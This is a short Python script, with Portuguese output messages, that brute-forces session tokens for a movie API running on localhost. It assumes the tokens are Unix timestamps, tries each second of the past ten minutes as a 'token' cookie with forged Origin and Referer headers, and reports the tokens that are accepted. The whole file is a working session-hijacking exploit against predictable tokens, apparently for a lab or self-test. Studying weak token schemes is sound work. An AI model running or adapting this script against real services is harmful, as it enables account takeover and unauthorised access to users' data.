import requests
import time

BASE_URL = "http://localhost:8000/movies"
HEADERS = {
    "Origin": "http://localhost:5500",
    "Referer": "http://localhost:5500",
}

def try_token(token):
    cookies = {"token": str(token)}
    response = requests.get(BASE_URL, headers=HEADERS, cookies=cookies)
    if response.status_code == 200 and "title" in response.text:
        print(f"\n[+] Token válido encontrado: {token}")
        print(f"    Preview: {response.text[:200]}...\n")
        return True
    return False

if __name__ == "__main__":
    now = int(time.time())
    start = now - 600 # 10 minutos
    end = now

    print(f"\nTestando tokens no intervalo: {start} até {end}\n")

    valid_tokens = []

    for t in range(start, end + 1):
        if try_token(t):
            valid_tokens.append(t)

    print("\nTokens válidos encontrados:")
    if valid_tokens:
        for token in valid_tokens:
            print(f" - {token}")
    else:
        print("Nenhum token válido encontrado.")
